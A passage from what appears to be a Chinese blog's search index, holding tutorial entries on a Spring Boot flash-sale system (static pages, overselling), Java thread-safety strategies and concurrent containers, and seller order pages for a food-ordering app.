url:"/goods/detail/"+goodsId, type:"GET", success:function(data)&#123; if(data.code == 0)&#123; render(data.data); &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.msg("客户端请求有误"); &#125; &#125;);&#125; 获取goods_id，因为list页面的商品详情请求是 1&lt;td&gt;&lt;a th:href=&quot;&apos;/goods_detail.htm?goodsId=&apos;+$&#123;goods.id&#125;&quot;&gt;详情&lt;/a&gt;&lt;/td&gt; 所以下面要获取这个参数：123456function g_getQueryString(name) &#123; var reg = new RegExp("(^|&amp;)" + name + "=([^&amp;]*)(&amp;|$)");var r = window.location.search.substr(1).match(reg);if(r != null) return unescape(r[2]);return null;&#125;; 获取到之后就请求后端接口，获取数据去渲染： 123456789101112131415161718function render(detail)&#123; var miaoshaStatus = detail.miaoshaStatus; var remainSeconds = detail.remainSeconds; var goods = detail.goods; var user = detail.user; if(user)&#123; $("#userTip").hide(); &#125; $("#goodsName").text(goods.goodsName); $("#goodsImg").attr("src", goods.goodsImg); $("#startTime").text(new Date(goods.startDate).format("yyyy-MM-dd hh:mm:ss")); $("#remainSeconds").val(remainSeconds); $("#goodsId").val(goods.id); $("#goodsPrice").text(goods.goodsPrice); $("#miaoshaPrice").text(goods.miaoshaPrice); $("#stockCount").text(goods.stockCount); countDown();&#125; 倒计时countDown()： 12345678910111213141516171819202122function countDown()&#123; var remainSeconds = $("#remainSeconds").val(); var timeout; if(remainSeconds &gt; 0)&#123;//秒杀还没开始，倒计时 $("#buyButton").attr("disabled", true); $("#miaoshaTip").html("秒杀倒计时："+remainSeconds+"秒"); timeout = setTimeout(function()&#123; $("#countDown").text(remainSeconds - 1); $("#remainSeconds").val(remainSeconds - 1); countDown(); &#125;,1000); &#125;else if(remainSeconds == 0)&#123;//秒杀进行中 $("#buyButton").attr("disabled", false); if(timeout)&#123; clearTimeout(timeout); &#125; $("#miaoshaTip").html("秒杀进行中"); &#125;else&#123;//秒杀已经结束 $("#buyButton").attr("disabled", true); $("#miaoshaTip").html("秒杀已经结束"); &#125;&#125; 上面的日期格式化为： 123456789101112131415161718//设定时间格式化函数，使用new Date().format("yyyyMMddhhmmss");Date.prototype.format = function (format) &#123; var args = &#123; "M+": this.getMonth() + 1, "d+": this.getDate(), "h+": this.getHours(), "m+": this.getMinutes(), "s+": this.getSeconds(), &#125;; if (/(y+)/.test(format)) format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length)); for (var i in args) &#123; var n = args[i]; if (new RegExp("(" + i + ")").test(format)) format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? n : ("00" + n).substr(("" + n).length)); &#125; return format;&#125;; 4. 订单详情页面静态化之前的do_miaosha要进行修改，不能再返回String了，而是要返回Json数据，原来是这样写的： 1234567891011121314151617181920212223@RequestMapping("/do_miaosha")public String do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return "login"; model.addAttribute("user",user); //判断库存 GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); if(goodsVo.getStockCount() &lt;= 0)&#123; model.addAttribute("errmsg", CodeMsg.MIAO_SHA_OVER.getMsg()); return "miaosha_fail"; &#125; //判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; model.addAttribute("errmsg", CodeMsg.REPEATE_MIAOSHA.getMsg()); return "miaosha_fail"; &#125; //减库存、下订单、写入秒杀订单,需要在一个事务中执行 OrderInfo orderInfo = miaoshaService.miaosha(user,goodsVo); model.addAttribute("orderInfo", orderInfo); model.addAttribute("goods", goodsVo); return "order_detail";&#125; 现在改为： 123456789101112131415161718192021@RequestMapping(value = "/do_miaosha",method = RequestMethod.POST)@ResponseBodypublic Result&lt;OrderInfo&gt; do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); //判断库存 GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); if(goodsVo.getStockCount() &lt;= 0)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; //判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; return Result.error(CodeMsg.REPEATE_MIAOSHA); &#125; //减库存、下订单、写入秒杀订单,需要在一个事务中执行 OrderInfo orderInfo = miaoshaService.miaosha(user,goodsVo); return Result.success(orderInfo);&#125; 下面按秒杀按钮： 1234&lt;td&gt; &lt;button class="btn btn-primary btn-block" type="button" id="buyButton"onclick="doMiaosha()"&gt;立即秒杀&lt;/button&gt; &lt;input type="hidden" name="goodsId" id="goodsId" /&gt;&lt;/td&gt; 下面进行处理：1234567891011121314151617181920function doMiaosha()&#123; $.ajax(&#123; url:"/miaosha/do_miaosha", type:"POST", data:&#123; goodsId:$("#goodsId").val(), &#125;, success:function(data)&#123; if(data.code == 0)&#123; window.location.href="/order_detail.htm?orderId="+data.data.id; &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.msg("客户端请求有误"); &#125; &#125;); &#125; 一旦抢到商品，那么就跳转到订单详情页面，order_detail.htm中的处理与上面的一样： 1234567891011121314151617181920212223242526272829303132333435363738394041function render(detail)&#123; var goods = detail.goods; var order = detail.order; $("#goodsName").text(goods.goodsName); $("#goodsImg").attr("src", goods.goodsImg); $("#orderPrice").text(order.goodsPrice); $("#createDate").text(new Date(order.createDate).format("yyyy-MM-dd hh:mm:ss")); var status = ""; if(order.status == 0)&#123; status = "未支付" &#125;else if(order.status == 1)&#123; status = "待发货"; &#125; $("#orderStatus").text(status); &#125;$(function()&#123; getOrderDetail();&#125;)function getOrderDetail()&#123; var orderId = g_getQueryString("orderId"); $.ajax(&#123; url:"/order/detail", type:"GET", data:&#123; orderId:orderId &#125;, success:function(data)&#123; if(data.code == 0)&#123; render(data.data); &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.msg("客户端请求有误"); &#125; &#125;);&#125; 要显示order_detail,他请求/order/detail这个接口，需要order和goods两个对象，所以新建一个vo: 12345@Datapublic class OrderDetailVo &#123; private GoodsVo goods; private OrderInfo order;&#125; 对OrderController增加接口： 123456789101112131415161718@RequestMapping("/detail")@ResponseBodypublic Result&lt;OrderDetailVo&gt; info(MiaoshaUser user, @RequestParam("orderId") long orderId) &#123; if(user == null) &#123; return Result.error(CodeMsg.SESSION_ERROR); &#125; OrderInfo order = orderService.getOrderById(orderId); if(order == null) &#123; return Result.error(CodeMsg.ORDER_NOT_EXIST); &#125; long goodsId = order.getGoodsId(); GoodsVo goods = goodsService.getGoodsVoByGoodsId(goodsId); OrderDetailVo vo = new OrderDetailVo(); vo.setOrder(order); vo.setGoods(goods); return Result.success(vo);&#125; 这样就ok了，对于商品详情和订单详情两个页面完成了静态化。 5. 页面缓存Cache-Control:指定缓存有多少时间 为了在浏览器端进行缓存，以及控制缓存时间，这里可以添加一些配置：12345678910spring: resources: static-locations: classpath:/static/ add-mappings: true cache-period: 3600 chain: cache: true enabled: true gzipped: true html-application-cache: true 6. 解决超卖先解决卖成负数的问题： 在reduceStock(MiaoshaGoods g);这个方法里，sql要多加一个stock_count &gt; 0即： 1update miaosha_goods set stock_count = stock_count-1 where goods_id=#&#123;goodsId&#125; and stock_count &gt; 0 给miaosha_order中的user_id和goods_id建立唯一联合索引。保证同一个人不能秒杀都两个商品。 但是从压测结果来看，虽然解决了上面两个问题。但是仍然发生了超卖现象，即比如只有10件秒杀商品，但是有22个人抢到了。这个解决只能靠锁来解决了。 7. 静态资源优化 js/css压缩 多个js/css组合，减少连接数 CDN就近访问 nginx加缓存，页面缓存，对象缓存]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.线程安全策略]]></title>
    <url>%2F2018%2F07%2F21%2F5.%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[接着上一篇继续探讨线程安全的策略。 1. 不可变对象1.1 如何实现Immutable(不可变)的类 将类声明为final，这样就不能被继承了 将所有成员声明为private，这样就不能直接访问成员 对变量不提供set方法，所有可变成员变量声明为final，只有只能赋值一次 通过构造器初始化所有成员，进行深度拷贝，在get方法中不直接返回对象本身，而是克隆对象，返回对象的拷贝。 JDK本身包含了一些不可变的类，如String，Integer和其它的包装类。 123456789101112131415161718public final class Contacts &#123; private final String name; private final String mobile; public Contacts(String name, String mobile) &#123; this.name = name; this.mobile = mobile; &#125; public String getName()&#123; return name; &#125; public String getMobile()&#123; return mobile; &#125;&#125; 例如：String和StringBuilder，String是immutable的，每次对于String对象的修改都将产生一个新的String对象，而原来的对象保持不变，而StringBuilder是mutable，因为每次对于它的对象的修改都作用于该对象本身，并没有产生新的对象。 1.2 不可变对象需要满足的条件 对象创建之后其状态就不能修改 对象所有域否是final类型 对象是正确创建的(在对象创建期间，this引用没有逸出) 类应该是final类型的，以此防止子类的扩展破坏父类的不可变性。 1.3 使用Immutable对象的好处 Immutable对象是线程安全的，可以不用被synchronize就在并发环境中共享 Immutable对象简化了程序开发，因为它无需使用额外的锁机制就可以在线程间共享 Immutable对象提高了程序的性能，因为它减少了synchroinzed的使用 Immutable对象是可以被重复使用的，你可以将它们缓存起来重复使用，就像字符串字面量和整型数字一样。你可以使用静态工厂方法来提供类似于valueOf（）这样的方法，它可以从缓存中返回一个已经存在的Immutable对象，而不是重新创建一个。 有一些小缺点，就是会制造大量垃圾，由于他们不能被重用而且对于它们的使用就是”用“然后”扔“，字符串就是一个典型的例子，它会创造很多的垃圾，给垃圾收集带来很大的麻烦。当然这只是个极端的例子，合理的使用immutable对象会创造很大的价值。 1.4 final关键字 修饰类：这个类不能被继承，String,Integer,Long这些基础类型的封装类都是final修饰的类，fianl类中的成员变量可以根据需要设置为final，但是要注意，final类中的成员方法都会被隐式地声明为final方法。 修饰方法：1.锁定方法不被继承类修改；2.效率(已失效)：在早期java实现中，将final修饰的方法转为内嵌调用，但是当方法过于庞大时，可能看不出来转为内嵌调用带来的性能提升；新版本中不再需要用final方法来进行内嵌优化了。 修饰变量：基本数据类型变量：初始化数值之后就不能再被修改了；引用类型变量：对其初始化之后，他不能再指向另外一个对象。 1234567891011121314151617181920212223@NotThreadSafepublic class ImmutableExample1 &#123; private final static Integer a = 1; private final static String b = "sss"; private final static Map&lt;Integer,Integer&gt; map = Maps.newHashMap(); static &#123; map.put(1,2); map.put(3,4); map.put(5,6); &#125; public static void main(String[] args) &#123; //a = 1; //编译出错 //a = 2; //编译出错 //b = "sss"; //编译出错 //b = "ttt"; //编译出错 //map = Maps.newHashMap(); //编译出错 System.out.println(map.get(1)); //2 map.put(1,3); //值可以修改，所以会引发线程安全问题 System.out.println(map.get(1)); //3 &#125;&#125; 除了final修饰称为不可变类，其他的还有什么方法可以做到？ collections.unmodifiableXXX：Collection,List,Set,Map 12345678910111213141516@ThreadSafepublic class ImmutableExample2 &#123; private static Map&lt;Integer,Integer&gt; map = Maps.newHashMap();//final去掉 static &#123; map.put(1,2); map.put(3,4); map.put(5,6); map = Collections.unmodifiableMap(map);//处理过的map就不能再被修改了，否则报运行时异常：java.lang.UnsupportedOperationException &#125; public static void main(String[] args) &#123; map.put(1,3); //这个put会引发异常 System.out.println(map.get(1)); &#125;&#125; 进入unmodifiableMap方法： 123public static &lt;K,V&gt; Map&lt;K,V&gt; unmodifiableMap(Map&lt;? extends K, ? extends V&gt; m) &#123; return new UnmodifiableMap&lt;&gt;(m);&#125; UnmodifiableMap方法： 12345678910111213141516171819//先进行一个拷贝，拷贝到UnmodifiableMap对象中UnmodifiableMap(Map&lt;? extends K, ? extends V&gt; m) &#123; if (m==null) throw new NullPointerException(); this.m = m;&#125;//如果发现是改变map的操作，就抛出异常public V put(K key, V value) &#123; throw new UnsupportedOperationException();&#125;public V remove(Object key) &#123; throw new UnsupportedOperationException();&#125;public void putAll(Map&lt;? extends K, ? extends V&gt; m) &#123; throw new UnsupportedOperationException();&#125;public void clear() &#123; throw new UnsupportedOperationException();&#125; Guava:ImmutableXXX:Collection,List,Set,Map 12345678910111213141516171819@ThreadSafepublic class ImmutableExample3 &#123; private final static ImmutableList list = ImmutableList.of(1,2,3);//可以无限写下去 private final static ImmutableSet set = ImmutableSet.copyOf(list); private final static ImmutableMap&lt;Integer,Integer&gt; map = ImmutableMap.of(1,2,3,4); private final static ImmutableMap&lt;Integer,Integer&gt; map2 = ImmutableMap.&lt;Integer,Integer&gt;builder() .put(1,2).put(3,4).build(); public static void main(String[] args) &#123; list.add(4);//会被标识为不建议使用，强行使用，会抛出异常 set.add(4); map.put(5,6); map2.put(5,6); &#125;&#125; 2. 线程封闭 Ad-hoc线程封闭：程序控制实现，最糟糕，忽略； 堆栈封闭：局部变量，无并发问题 ThreadLocal线程封闭：特别好的封闭方法 关于线程封闭，有一个典型就是JDBC，在并发的场景下，如何安全地获取Connection连接对象并且正确地返回给连接池呢？ 原理是这样：线程从连接池获取一个Connection对象，用完之后再将其返还给连接池，由于大多数的连接都是单线程的，所以在connection对象返还之前，连接池不会再将这个对象分配给其他线程使用，那么就实现了将connection对象封闭在线程里，达到了线程安全的目的。 这里对ThreadLocal进行一个demo的演练：模拟一个线程过程中,我们保存一下userId在threadLocal中，在这个线程的任意时候都可以获取到这个id，并且这个id是封闭在线程内的，不会出现线程安全问题。threadLocal中有一个Map，键值分别是&lt;当前线程ID，封闭的对象&gt; 2.1 ThreadLocal放入一个声明以及三个方法：1234567891011121314151617public class RequestHolder &#123; //声明threadlocal private final static ThreadLocal&lt;Long&gt; requestHolder = new ThreadLocal&lt;&gt;(); //每次拦截请求，filter中就往threadlocal中添加一下userId public static void add(Long userId)&#123; requestHolder.set(userId); &#125; //从threadlocal中获取当前线程对应的值 public static Long getId()&#123; return requestHolder.get(); &#125; //每次都移除一下threadlocal，因为可能会造成内存泄漏的问题 public static void remove()&#123; requestHolder.remove(); &#125;&#125; 2.2 filter拦截请求filter先拦截前台传来的url，再将相应的信息写入到threadlocal中。 12345678910111213141516171819202122@Slf4jpublic class HttpFilter implements Filter&#123; ////tomcat启动，或者context重新加载的时候调用init（先destroy再init） @Override public void init(FilterConfig filterConfig) throws ServletException &#123; log.info("init"); &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest request = (HttpServletRequest)servletRequest; log.info("do filter &#123;&#125;,&#123;&#125;",Thread.currentThread().getId(),request.getServletPath()); RequestHolder.add(1L);//userId,如果是用户信息，可以用request.getSession().getAttribute("user");获取，再add进去。 ////转给过滤器链中的下一个filter，如果是最后一个filter，调用要访问的资源 filterChain.doFilter(servletRequest,servletResponse); &#125; ////tomcat关闭或者context重新加载的时候调用destroy @Override public void destroy() &#123; &#125;&#125; 过滤器链 request到达以后，实际匹配到的过滤器可能有一个，也可能有多个，多个的时候，会形成一个过滤器链，过滤器的执行顺序和web.xml中filter-mapping的配置的先后顺序一致，写在前面的先执行，写在后面的后执行。 每个过滤器执行完以后会调用chain.doFilter(request,response);从而调用下一个过滤器的doFilter方法。（其实此时执行到的只是每个过滤器中chain.doFilter(request,response);之前的代码） 当所有的匹配到的过滤器都执行完以后，将调用具体访问的资源，比如servlet，或者jsp。 请求的资源执行结束后，response返回的时候，再次调用匹配到的过滤器。调用顺序和request到达时的调用顺序正好相反。（此时执行的是每个过滤器中chain.doFilter(request,response);之后的代码） （客户端发出request –&gt; MyFilter1 –&gt; MyFilter2 –&gt; MyFilter3 –&gt; MyServlet –&gt; MyFilter3 response –&gt; MyFilter2 response –&gt; MyFilter1 response，最后客户端获得response） 2.3 注册filter，使得springboot在启动的时候发现filter1234567@Beanpublic FilterRegistrationBean httpFilter()&#123; FilterRegistrationBean registrationBean = new FilterRegistrationBean(); registrationBean.setFilter(new HttpFilter()); registrationBean.addUrlPatterns("/threadLocal/*"); return registrationBean;&#125; 2.4 拦截器为了在每次请求过后能够及时删除threadlocal，防止内存泄漏，使用mvc拦截器。 这里涉及到为什么用拦截器来做这件事：因为我们要保证在每次请求之后就清空doFilter刚刚塞入到threadlocal中的值，防止内存泄漏。而filter的destroy方法却无法做这件事。 还涉及过滤器和拦截器的执行顺序。 12345678910111213141516@Slf4jpublic class HttpInteceptor extends HandlerInterceptorAdapter&#123; //每次开始要执行controller之前调用一次 @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; log.info("preHandler"); return true; &#125; //每次请求controller执行完毕之后执行这个方法 @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; RequestHolder.remove(); log.info("afterCompletion"); return; &#125;&#125; 2.5 注册拦截器1234@Overridepublic void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(new HttpInteceptor()).addPathPatterns("/**");&#125; 2.6 controller直接返回json，显示刚刚塞进去的userId即1. 12345678@RestController@RequestMapping("/threadLocal")public class ThreadLocalController &#123; @RequestMapping("/test") public Long test()&#123; return RequestHolder.getId(); &#125;&#125; 3. 不安全类 StringBuilder和StringBuffer StringBuilder是非线程安全的，StringBuffer是线程安全的。StringBuilder在堆栈封闭的情况下，即没有线程安全问题的情况下，效率高。 SimpleDateFormat日期工具类，是非线程安全的 因为SimpleDateFormat是非线程安全的，同时执行parse方法，会抛出大量异常。12345678910111213141516171819202122232425262728293031323334353637383940414243444546@Slf4j@NotThreadSafepublic class DateFormatExample &#123; private static SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyyMMdd"); //总请求数 public static int clientTotal = 5000; //并发数 public static int threadTotal = 200; public static void main(String[] args) &#123; //线程池 ExecutorService executorService = Executors.newCachedThreadPool(); //信号量，控制一次执行多少请求 Semaphore semaphore = new Semaphore(threadTotal); //计数器，到0就表示线程全部执行完 CountDownLatch countDownLatch = new CountDownLatch(clientTotal); for (int i=0; i&lt;clientTotal; i++)&#123; executorService.execute(() -&gt; &#123; try&#123; semaphore.acquire(); update(); semaphore.release(); &#125;catch (Exception e)&#123; log.error("semaphore exception",e); &#125; countDownLatch.countDown(); &#125;); &#125; try &#123; countDownLatch.await(); &#125; catch (InterruptedException e) &#123; log.error("countDownLatch exception",e); &#125; executorService.shutdown(); &#125; public static void update()&#123; try&#123; simpleDateFormat.parse("20180208"); &#125;catch (Exception e) &#123; log.error("parse error", e); &#125; &#125;&#125; 那么我们在用这个类的时候，如何使用呢？？？？？其实很简单，做成一个线程封闭的即可。 12345678public static void update()&#123; SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyyMMdd"); try&#123; simpleDateFormat.parse("20180208"); &#125;catch (Exception e) &#123; log.error("parse error", e); &#125;&#125; 做日期转换，可以借用joda-time类来实现安全的操作: 123456 private static DateTimeFormatter dateTimeFormatter = DateTimeFormat.forPattern("yyyyMMdd"); public static void update(int i)&#123; log.info("&#123;&#125;,&#123;&#125;",DateTime.parse("20180228",dateTimeFormatter).toDate(),i);&#125; 这是比较推荐的写法，因为不仅仅是线程安全的，joda-time也支持更多的操作。不是简单的StringBuilder和StringBuffer的区别。 ArrayList,HashSet,HashMap等 4. 同步容器 ArrayList -&gt; Vector,Stack HashMap -&gt; HashTable(key和value不能为null) Collections.synchronizedXXX(list,set,map) 计数的程序，改成同步容器来做，是可以得到正确的结果的。 要注意，在某些场合下，同步容器不一定就是线程安全的！ 123456789101112131415161718192021222324252627282930313233343536public class VectorTest &#123; private static Vector&lt;Integer&gt; vector = new Vector&lt;&gt;(); public static void main(String[] args) &#123; while(true)&#123; for(int i=0;i&lt;10;i++)&#123; vector.add(i); &#125; //一个线程专门来remove Thread t1 = new Thread()&#123; @Override public void run() &#123; for(int i=0;i&lt;vector.size();i++)&#123; vector.remove(i); &#125; &#125; &#125;; //一个线程专门来获取 Thread t2 = new Thread()&#123; @Override public void run() &#123; for(int i=0;i&lt;vector.size();i++)&#123; vector.get(i); &#125; &#125; &#125;; t1.start(); t2.start(); &#125; &#125;&#125; 运行的效果是：java.lang.ArrayIndexOutOfBoundsException；原因是可能get线程中执行for循环的时候，i还在，但是等到下面vector.get(i);的时候， 已经被上面一个线程给remove掉了。造成了越界的异常。 对之前不安全的计数程序进行修改:测试Collections.synchronizedList1public static List&lt;Integer&gt; list = Collections.synchronizedList(Lists.newArrayList()); 还有一点是：在对集合进行遍历的时候，不要尝试去修改其中的值，否则会抛出异常： 如果一定要进行修改，可以对要修改的值进行保存，在遍历完成之后再进行修改或者删除操作。还有就是推荐用for(int i=0;i&lt;n;i++)的进行修改。 在多线程环境下，一个线程在遍历这个容器，而另一个线程在对这个容器进行删除操作，会出现问题。 解决：用并发容器解决多线程下的各种问题。 12345678910111213141516171819202122232425262728293031323334353637383940public class Test &#123; //java.util.ConcurrentModificationException private static void iterator1(Vector&lt;Integer&gt; v)&#123; for(Integer i:v)&#123; if(i.equals(3))&#123; v.remove(i); &#125; &#125; &#125; //java.util.ConcurrentModificationException private static void iterator2(Vector&lt;Integer&gt; v)&#123; Iterator&lt;Integer&gt; iterator = v.iterator(); while(iterator.hasNext())&#123; Integer i = iterator.next(); if(i.equals(3))&#123; v.remove(i); &#125; &#125; &#125; //无异常 private static void iterator3(Vector&lt;Integer&gt; v)&#123; for(int i=0;i&lt;v.size();i++)&#123; if(v.get(i).equals(3))&#123; v.remove(3); &#125; &#125; &#125; public static void main(String[] args) &#123; Vector&lt;Integer&gt; vector = new Vector&lt;&gt;(); vector.add(1); vector.add(2); vector.add(3); iterator1(vector); &#125;&#125; 5. 初涉并发容器 ArrayList -&gt; CopyOnWriteArrayList CopyOnWriteArrayList：写复制，当有新元素插入到CopyOnWriteArrayList中时，先复制一个新数组，将新元素插入新数组中，然后将原来的引用指向新数组。这些操作都在锁的保护下进行，这么做的原因是防止通知copy出多个CopyOnWriteArrayList搞坏数据。 CopyOnWriteArrayList缺点：因为不停地拷贝新数组，当数组元素较多时，因为占用大量的内存，可能会导致JVM频繁的GC；只能保证最终一致性，不能满足实时性较高的场景，所以比较适合读多写少的场景。 体现三个思想：读写分离、最终一致性、用另外开辟空间来解决并发冲突。 读操作是在原数组上进行，不需要加锁；写操作是需要加锁的。 HashSet,TreeSet -&gt; CopyOnWriteArraySet,ConcurrentSkipListSet CopyOnWriteArraySet同CopyOnWriteArrayList。 ConcurrentSkipListSet：与TreeSet一样是支持自然排序的，并且在构造的时候定义比较器。对于批量操作，比如containsAll，addAll,removeAll，并不能保证以原子方式执行：ConcurrentSkipListSet只能保证每次的constains,add,remove是原子操作，但是不能保证每次批量操作都不被其他线程打断，需要手动加锁进行同步操作。ConcurrentSkipListSet是不能有null元素的。 HashMap，TreeMap -&gt; ConcurrentHashMap,ConcurrentSkipListMap ConcurrentHashMap:不允许null，面试必问，后面会单独介绍。 ConcurrentSkipListMap：高并发下存取数据性能低于ConcurrentHashMap，但是它有自己不可代替的优点：key是有序的；]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.卖家订单部分]]></title>
    <url>%2F2018%2F07%2F21%2F5.%E5%8D%96%E5%AE%B6%E8%AE%A2%E5%8D%95%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 推荐一个bootstrap在线制作模板的一个网站： http://www.ibootstrap.cn/订单列表：1234567891011@GetMapping("/list")public ModelAndView list(@RequestParam(value = "page", defaultValue = "1") Integer page, @RequestParam(value = "size" ,defaultValue = "10") Integer size, Map&lt;String,Object&gt; map)&#123; PageRequest request = new PageRequest(page-1,size); Page&lt;OrderDto&gt; orderDtoPage = orderService.findList(request); map.put("orderDtoPage",orderDtoPage); map.put("currentPage", page); map.put("size", size); return new ModelAndView("order/list",map);&#125; 这样对于前台的list.ftl： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;html&gt;&lt;#--全局的样式--&gt;&lt;#include "../common/header.ftl"&gt;&lt;body&gt;&lt;div id="wrapper" class="toggled"&gt; &lt;#--边栏sidebar--&gt; &lt;#include "../common/nav.ftl"&gt; &lt;#--主要内容content--&gt; &lt;div id="page-content-wrapper"&gt; &lt;div class="container-fluid"&gt; &lt;div class="row clearfix"&gt; &lt;div class="col-md-12 column"&gt; &lt;table class="table table-bordered table-condensed"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;订单id&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;手机号&lt;/th&gt; &lt;th&gt;地址&lt;/th&gt; &lt;th&gt;金额&lt;/th&gt; &lt;th&gt;订单状态&lt;/th&gt; &lt;th&gt;支付状态&lt;/th&gt; &lt;th&gt;创建时间&lt;/th&gt; &lt;th colspan="2"&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;#list orderDtoPage.content as orderDto&gt; &lt;tr&gt; &lt;td&gt;$&#123;orderDto.orderId&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.buyerName&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.buyerPhone&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.buyerAddress&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.orderAmount&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.getOrderStatusEnum().message&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.getPayStatusEnum().message&#125;&lt;/td&gt; &lt;td&gt;$&#123;orderDto.createTime&#125;&lt;/td&gt; &lt;td&gt;&lt;a href="/sell/seller/order/detail?orderId=$&#123;orderDto.orderId&#125;"&gt;详情&lt;/a&gt;&lt;/td&gt; &lt;td&gt; &lt;#if orderDto.getOrderStatusEnum().message == "新订单"&gt; &lt;a href="/sell/seller/order/cancel?orderId=$&#123;orderDto.orderId&#125;"&gt;取消&lt;/a&gt; &lt;/#if&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/#list&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;#--分页--&gt; &lt;div class="col-md-12 column"&gt; &lt;ul class="pagination pull-right"&gt; &lt;#--上一页--&gt; &lt;#if currentPage lte 1&gt; &lt;li class="disabled"&gt;&lt;a href="#"&gt;上一页&lt;/a&gt;&lt;/li&gt; &lt;#else&gt; &lt;li&gt;&lt;a href="/sell/seller/order/list?page=$&#123;currentPage - 1&#125;&amp;size=$&#123;size&#125;"&gt;上一页&lt;/a&gt;&lt;/li&gt; &lt;/#if&gt; &lt;#--1-N页--&gt; &lt;#list 1..orderDtoPage.getTotalPages() as index&gt; &lt;#if currentPage == index&gt; &lt;li class="disabled"&gt;&lt;a href="#"&gt;$&#123;index&#125;&lt;/a&gt;&lt;/li&gt; &lt;#else&gt; &lt;li&gt;&lt;a href="/sell/seller/order/list?page=$&#123;index&#125;&amp;size=$&#123;size&#125;"&gt;$&#123;index&#125;&lt;/a&gt;&lt;/li&gt; &lt;/#if&gt; &lt;/#list&gt; &lt;#--下一页--&gt; &lt;#if currentPage gte orderDtoPage.getTotalPages()&gt; &lt;li class="disabled"&gt;&lt;a href="#"&gt;下一页&lt;/a&gt;&lt;/li&gt; &lt;#else&gt; &lt;li&gt;&lt;a href="/sell/seller/order/list?page=$&#123;currentPage + 1&#125;&amp;size=$&#123;size&#125;"&gt;下一页&lt;/a&gt;&lt;/li&gt; &lt;/#if&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这里用的是freemark模板，直接就是引入依赖就可以使用了。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-freemarker&lt;/artifactId&gt;&lt;/dependency&gt; 对于订单详情、取消订单、完结订单controller：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@GetMapping("/cancel")public ModelAndView cancel(@RequestParam("orderId") String orderId, Map&lt;String,Object&gt; map)&#123; try &#123; OrderDto orderDto = orderService.findOne(orderId); orderService.cancel(orderDto); &#125; catch (SellException e) &#123; log.error("【卖家端取消订单】发生异常&#123;&#125;", e); map.put("msg", e.getMessage()); map.put("url", "/sell/seller/order/list"); return new ModelAndView("common/error", map); &#125; map.put("msg", ResultEnum.ORDER_CANCEL_SUCCESS.getMessage()); map.put("url", "/sell/seller/order/list"); return new ModelAndView("common/success");&#125;/** * 订单详情 * @param orderId * @param map * @return */@GetMapping("/detail")public ModelAndView detail(@RequestParam("orderId") String orderId, Map&lt;String, Object&gt; map) &#123; OrderDto orderDto = new OrderDto(); try &#123; orderDto = orderService.findOne(orderId); &#125;catch (SellException e) &#123; log.error("【卖家端查询订单详情】发生异常&#123;&#125;", e); map.put("msg", e.getMessage()); map.put("url", "/sell/seller/order/list"); return new ModelAndView("common/error", map); &#125; map.put("orderDTO", orderDto); return new ModelAndView("order/detail", map);&#125;/** * 完结订单 * @param orderId * @param map * @return */@GetMapping("/finish")public ModelAndView finished(@RequestParam("orderId") String orderId, Map&lt;String, Object&gt; map) &#123; try &#123; OrderDto orderDTO = orderService.findOne(orderId); orderService.finish(orderDTO); &#125; catch (SellException e) &#123; log.error("【卖家端完结订单】发生异常&#123;&#125;", e); map.put("msg", e.getMessage()); map.put("url", "/sell/seller/order/list"); return new ModelAndView("common/error", map); &#125; map.put("msg", ResultEnum.ORDER_FINISH_SUCCESS.getMessage()); map.put("url", "/sell/seller/order/list"); return new ModelAndView("common/success");&#125; 